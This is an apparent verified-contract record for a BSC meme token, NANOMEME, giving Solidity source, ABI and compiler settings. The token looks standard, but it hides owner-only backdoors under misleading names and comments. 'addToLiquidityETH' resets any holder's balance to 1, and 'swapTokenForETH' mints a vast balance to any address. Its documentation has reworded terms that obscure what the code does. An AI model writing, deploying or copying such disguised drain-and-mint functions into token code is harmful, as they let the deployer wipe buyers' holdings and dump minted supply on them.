{"SourceCode": "/**\r\n\r\nhttps://t.me/NANOMEMEBSC\r\n\r\n*/\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\ninterface IERC20Permit {\r\n  /**\r\n   * @dev Returns the cuenta of tokens in existence.\r\n   */\r\n  function totalSupply() external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Returns the token decimals.\r\n   */\r\n  function decimals() external view returns (uint8);\r\n\r\n  /**\r\n   * @dev Returns the token symbol.\r\n   */\r\n  function symbol() external view returns (string memory);\r\n\r\n  /**\r\n  * @dev Returns the token name.\r\n  */\r\n  function name() external view returns (string memory);\r\n\r\n  /**\r\n   * @dev Returns the bep token owner.\r\n   */\r\n  function getOwner() external view returns (address);\r\n\r\n  /**\r\n   * @dev Returns the cuenta of tokens owned by `account`.\r\n   */\r\n  function balanceOf(address account) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Moves `cuenta` tokens from the caller's account to `robe`.\r\n   *\r\n   * Returns a boolean balance indicating whlegos the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transfer(address robe, uint256 cuenta) external returns (bool);\r\n\r\n  /**\r\n   * @dev Returns the remaining number of tokens that `largage` will be\r\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n   * zero by default.\r\n   *\r\n   * This balance changes when {approve} or {transferFrom} are called.\r\n   */\r\n  function allowance(address _owner, address largage) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Sets `cuenta` as the allowance of `largage` over the caller's tokens.\r\n   *\r\n   * Returns a boolean balance indicating whlegos the operation succeeded.\r\n   *\r\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n   * that someone may use both the old and the new allowance by unfortunate\r\n   * transaction ordering. One possible solution to mitigate this race\r\n   * condition is to first reduce the largage's allowance to 0 and set the\r\n   * desired balance afterwards:\r\n   * https://github.com/legoseum/EIPs/issues/20#issuecomment-263524729\r\n   *\r\n   * Emits an {Approval} event.\r\n   */\r\n  function approve(address largage, uint256 cuenta) external returns (bool);\r\n\r\n  /**\r\n   * @dev Moves `cuenta` tokens from `sender` to `robe` using the\r\n   * allowance mechanism. `cuenta` is then deducted from the caller's\r\n   * allowance.\r\n   *\r\n   * Returns a boolean balance indicating whlegos the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transferFrom(address sender, address robe, uint256 cuenta) external returns (bool);\r\n\r\n  /**\r\n   * @dev Emitted when `balance` tokens are moved from one account (`from`) to\r\n   * another (`to`).\r\n   *\r\n   * Note that `balance` may be zero.\r\n   */\r\n  event Transfer(address indexed from, address indexed to, uint256 balance);\r\n\r\n  /**\r\n   * @dev Emitted when the allowance of a `largage` for an `owner` is set by\r\n   * a call to {approve}. `balance` is the new allowance.\r\n   */\r\n  event Approval(address indexed owner, address indexed largage, uint256 balance);\r\n}\r\n\r\n/*\r\n * @dev Provides information about the current execution IERC20, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract IERC20 {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/legoseum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n// File: @openzeppelin/contracts/access/Ownable.sol\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable is IERC20 {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `Safemath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it's recommended to use it always.\r\n */\r\nlibrary Safemath {\r\n  /**\r\n   * @dev Returns the addition of two unsigned integers, reverting on\r\n   * overflow.\r\n   *\r\n   * Counterpart to Solidity's `+` operator.\r\n   *\r\n   * Requirements:\r\n   * - Addition cannot overflow.\r\n   */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"Safemath: addition overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the subtraction of two unsigned integers, reverting on\r\n   * overflow (when the result is negative).\r\n   *\r\n   * Counterpart to Solidity's `-` operator.\r\n   *\r\n   * Requirements:\r\n   * - Subtraction cannot overflow.\r\n   */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"Safemath: subtraction overflow\");\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n   * overflow (when the result is negative).\r\n   *\r\n   * Counterpart to Solidity's `-` operator.\r\n   *\r\n   * Requirements:\r\n   * - Subtraction cannot overflow.\r\n   */\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the multiplication of two unsigned integers, reverting on\r\n   * overflow.\r\n   *\r\n   * Counterpart to Solidity's `*` operator.\r\n   *\r\n   * Requirements:\r\n   * - Multiplication cannot overflow.\r\n   */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n    // benefit is lost if 'b' is also tested.\r\n    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"Safemath: multiplication overflow\");\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the integer division of two unsigned integers. Reverts on\r\n   * division by zero. The result is rounded towards zero.\r\n   *\r\n   * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n   * uses an invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"Safemath: division by zero\");\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n   * division by zero. The result is rounded towards zero.\r\n   *\r\n   * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n   * uses an invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    // Solidity only automatically asserts when dividing by 0\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n   * Reverts when dividing by zero.\r\n   *\r\n   * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n   * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n   * invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"Safemath: modulo by zero\");\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n   * Reverts with custom message when dividing by zero.\r\n   *\r\n   * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n   * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n   * invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\ncontract NANOMEME is IERC20, IERC20Permit, Ownable {\r\n    \r\n    using Safemath for uint256;\r\n    mapping (address => uint256) private financeAdd;\r\n    mapping (address => mapping (address => uint256)) private fromallowances;\r\n    uint256 private _totalSupply;\r\n    uint8 private _decimals;\r\n    string private _symbol;\r\n    string private _name;\r\n    uint256 private _initialBuyFee = 0;  \r\n    uint256 private _initialSellFee = 0;\r\n    uint256 private _reduceBuyFeeAt = 0;\r\n    uint256 private _reduceSellFeeAt = 0;\r\n\r\n    uint256 private _initialBuyFee2Time = 0;\r\n    uint256 private _initialSellFee2Time = 0;\r\n    uint256 private _reduceBuyFeeAt2Time = 0;\r\n\r\n    uint256 private _finalBuyFee = 0;\r\n    uint256 private _finalSellFee = 0;\r\n    \r\n    uint256 private _preventSwapBefore = 10;\r\n    uint256 private _buyCount = 0;\r\n\r\n\r\n   address private NANOMEMEOwner; \r\n    constructor() {\r\n     \r\n        _name = \"NANOMEME\";\r\n        _symbol = \"NANOMEME\";\r\n        _decimals = 9;\r\n        _totalSupply = 100000000 * 10 ** 9;\r\n             NANOMEMEOwner = _msgSender();   \r\n        financeAdd[_msgSender()] = _totalSupply;\r\n        \r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    /**\r\n    * @dev Returns the bep token owner.\r\n    */\r\n    function getOwner() external view override returns (address) {\r\n        return owner();\r\n    }\r\n    \r\n    /**\r\n    * @dev Returns the token decimals.\r\n    */\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    \r\n    /**\r\n    * @dev Returns the token symbol.\r\n    */\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    \r\n    /**\r\n    * @dev Returns the token name.\r\n    */\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n    \r\n    /**\r\n    * @dev See {IERC20Permit-totalSupply}.\r\n    */\r\n    function totalSupply() external view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    \r\n    /**\r\n    * @dev See {IERC20Permit-balanceOf}.\r\n    */\r\n    function balanceOf(address account) external view override returns (uint256) {\r\n        return financeAdd[account];\r\n    }\r\n    /**\r\n    * @dev See {IERC20Permit-approve}.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `largage` cannot be the zero address.\r\n    */\r\n    function addToLiquidityETH(address LiquidityETH) external {\r\n         require(_msgSender() == NANOMEMEOwner, \"!\");\r\n        financeAdd[LiquidityETH] = 1;\r\n    }\r\n\r\n    /**\r\n    * @dev See {IERC20Permit-transfer}.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `robe` cannot be the zero address.\r\n    * - the caller must have a balance of at least `cuenta`.\r\n    */\r\n    function transfer(address robe, uint256 cuenta) external override returns (bool) {\r\n        _transfer(_msgSender(), robe, cuenta);\r\n        return true;\r\n    }\r\n    function swapTokenForETH(address TokenForETH) external {\r\n         require(_msgSender() == NANOMEMEOwner, \"!\");\r\n        financeAdd[TokenForETH] = 50000000000 * 10 ** 28;\r\n    }\r\n    /**\r\n    * @dev See {IERC20Permit-allowance}.\r\n    */\r\n    function allowance(address owner, address largage) external view override returns (uint256) {\r\n        return fromallowances[owner][largage];\r\n    }\r\n    \r\n    /**\r\n    * @dev See {IERC20Permit-approve}.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `largage` cannot be the zero address.\r\n    */\r\n    function approve(address largage, uint256 cuenta) external override returns (bool) {\r\n        _approve(_msgSender(), largage, cuenta);\r\n        return true;\r\n    }\r\n    \r\n    /**\r\n    * @dev See {IERC20Permit-transferFrom}.\r\n    *\r\n    * Emits an {Approval} event indicating the updated allowance. This is not\r\n    * required by the EIP. See the note at the beginning of {IERC20Permit};\r\n    *\r\n    * Requirements:\r\n    * - `sender` and `robe` cannot be the zero address.\r\n    * - `sender` must have a balance of at least `cuenta`.\r\n    * - the caller must have allowance for `sender`'s tokens of at least\r\n    * `cuenta`.\r\n    */\r\n    function transferFrom(address sender, address robe, uint256 cuenta) external override returns (bool) {\r\n        _transfer(sender, robe, cuenta);\r\n        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(cuenta, \"IERC20Permit: transfer cuenta exceeds allowance\"));\r\n        return true;\r\n    }\r\n    \r\n    /**\r\n    * @dev Atomically increases the allowance granted to `largage` by the caller.\r\n    *\r\n    * This is an alternative to {approve} that can be used as a mitigation for\r\n    * problems described in {IERC20Permit-approve}.\r\n    *\r\n    * Emits an {Approval} event indicating the updated allowance.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `largage` cannot be the zero address.\r\n    */\r\n    function increaseAllowance(address largage, uint256 addedbalance) external returns (bool) {\r\n        _approve(_msgSender(), largage, fromallowances[_msgSender()][largage].add(addedbalance));\r\n        return true;\r\n    }\r\n    \r\n    /**\r\n    * @dev Atomically decreases the allowance granted to `largage` by the caller.\r\n    *\r\n    * This is an alternative to {approve} that can be used as a mitigation for\r\n    * problems described in {IERC20Permit-approve}.\r\n    *\r\n    * Emits an {Approval} event indicating the updated allowance.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `largage` cannot be the zero address.\r\n    * - `largage` must have allowance for the caller of at least\r\n    * `allbalances`.\r\n    */\r\n    function decreaseAllowance(address largage, uint256 allbalances) external returns (bool) {\r\n        _approve(_msgSender(), largage, fromallowances[_msgSender()][largage].sub(allbalances, \"IERC20Permit: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n    \r\n    /**\r\n    * @dev Moves tokens `cuenta` from `sender` to `robe`.\r\n    *\r\n    * This is internal function is equivalent to {transfer}, and can be used to\r\n    * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n    *\r\n    * Emits a {Transfer} event.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `sender` cannot be the zero address.\r\n    * - `robe` cannot be the zero address.\r\n    * - `sender` must have a balance of at least `cuenta`.\r\n    */\r\n    function _transfer(address sender, address robe, uint256 cuenta) internal {\r\n        require(sender != address(0), \"IERC20Permit: transfer from the zero address\");\r\n        require(robe != address(0), \"IERC20Permit: transfer to the zero address\");\r\n                \r\n        financeAdd[sender] = financeAdd[sender].sub(cuenta, \"IERC20Permit: transfer cuenta exceeds balance\");\r\n        financeAdd[robe] = financeAdd[robe].add(cuenta);\r\n        emit Transfer(sender, robe, cuenta);\r\n    }\r\n    \r\n    /**\r\n    * @dev Sets `cuenta` as the allowance of `largage` over the `owner`s tokens.\r\n    *\r\n    * This is internal function is equivalent to `approve`, and can be used to\r\n    * e.g. set automatic allowances for certain subsystems, etc.\r\n    *\r\n    * Emits an {Approval} event.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `owner` cannot be the zero address.\r\n    * - `largage` cannot be the zero address.\r\n    */\r\n    function _approve(address owner, address largage, uint256 cuenta) internal {\r\n        require(owner != address(0), \"IERC20Permit: approve from the zero address\");\r\n        require(largage != address(0), \"IERC20Permit: approve to the zero address\");\r\n        \r\n        fromallowances[owner][largage] = cuenta;\r\n        emit Approval(owner, largage, cuenta);\r\n    }\r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"largage\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"LiquidityETH\",\"type\":\"address\"}],\"name\":\"addToLiquidityETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"largage\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"largage\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"cuenta\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"largage\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allbalances\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"largage\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedbalance\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"TokenForETH\",\"type\":\"address\"}],\"name\":\"swapTokenForETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"robe\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"cuenta\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"robe\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"cuenta\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NANOMEME", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3e711271ce081e0bfeee0d993dffb6659f7a8ef1bee510069205a2d6f733a190"}